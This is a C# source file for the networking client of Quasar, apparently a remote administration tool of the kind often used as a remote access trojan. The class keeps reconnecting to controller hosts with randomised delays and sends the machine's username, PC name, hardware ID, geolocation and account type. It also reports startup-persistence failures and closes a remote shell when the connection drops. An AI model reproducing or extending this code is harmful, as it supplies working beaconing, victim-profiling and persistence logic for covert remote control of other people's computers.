using Quasar.Client.Commands;
using Quasar.Client.Config;
using Quasar.Client.Data;
using Quasar.Client.Helper;
using Quasar.Client.Utilities;
using Quasar.Common.Helpers;
using Quasar.Common.Messages;
using Quasar.Common.Utilities;
using System;
using System.Diagnostics;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using System.Windows.Forms;

namespace Quasar.Client.Networking
{
    public class QuasarClient : Client
    {
        /// <summary>
        /// When Exiting is true, stop all running threads and exit.
        /// </summary>
        public static bool Exiting { get; private set; }
        public bool Identified { get; private set; }
        private readonly HostsManager _hosts;
        private readonly SafeRandom _random;

        public QuasarClient(HostsManager hostsManager, X509Certificate2 serverCertificate)
            : base(serverCertificate)
        {
            this._hosts = hostsManager;
            this._random = new SafeRandom();
            base.ClientState += OnClientState;
            base.ClientRead += OnClientRead;
            base.ClientFail += OnClientFail;
        }

        public void Connect()
        {
            while (!Exiting) // Main Connect Loop
            {
                if (!Connected)
                {
                    Thread.Sleep(100 + _random.Next(0, 250));

                    Host host = _hosts.GetNextHost();

                    base.Connect(host.IpAddress, host.Port);

                    Thread.Sleep(200);

                    Application.DoEvents();
                }

                while (Connected) // hold client open
                {
                    Application.DoEvents();
                    Thread.Sleep(2500);
                }

                if (Exiting)
                {
                    Disconnect();
                    return;
                }

                Thread.Sleep(Settings.RECONNECTDELAY + _random.Next(250, 750));
            }
        }

        private void OnClientRead(Client client, IMessage message, int messageLength)
        {
            if (!Identified)
            {
                if (message.GetType() == typeof(ClientIdentificationResult))
                {
                    var reply = (ClientIdentificationResult) message;
                    Identified = reply.Result;
                }
                return;
            }

            PacketHandler.HandlePacket(client, message);
        }

        private void OnClientFail(Client client, Exception ex)
        {
            Debug.WriteLine("Client Fail - Exception Message: " + ex.Message);
            client.Disconnect();
        }

        private void OnClientState(Client client, bool connected)
        {
            Identified = false; // always reset identification

            if (connected)
            {
                // send client identification once connected

                GeoLocationHelper.Initialize();

                client.Send(new ClientIdentification
                {
                    Version = Settings.VERSION,
                    OperatingSystem = PlatformHelper.FullName,
                    AccountType = WindowsAccountHelper.GetAccountType(),
                    Country = GeoLocationHelper.GeoInfo.Country,
                    CountryCode = GeoLocationHelper.GeoInfo.CountryCode,
                    Region = GeoLocationHelper.GeoInfo.Region,
                    City = GeoLocationHelper.GeoInfo.City,
                    ImageIndex = GeoLocationHelper.ImageIndex,
                    Id = DevicesHelper.HardwareId,
                    Username = WindowsAccountHelper.GetName(),
                    PcName = SystemHelper.GetPcName(),
                    Tag = Settings.TAG,
                    EncryptionKey = Settings.ENCRYPTIONKEY,
                    Signature = Convert.FromBase64String(Settings.SERVERSIGNATURE)
                });

                if (ClientData.AddToStartupFailed)
                {
                    Thread.Sleep(2000);
                    client.Send(new SetStatus
                    {
                        Message = "Adding to startup failed."
                    });
                }
            }
            

            if (!connected && !Exiting)
                LostConnection();
        }

        private void LostConnection()
        {
            CommandHandler.CloseShell();
        }

        public void Exit()
        {
            Exiting = true;
            Disconnect();
        }
    }
}
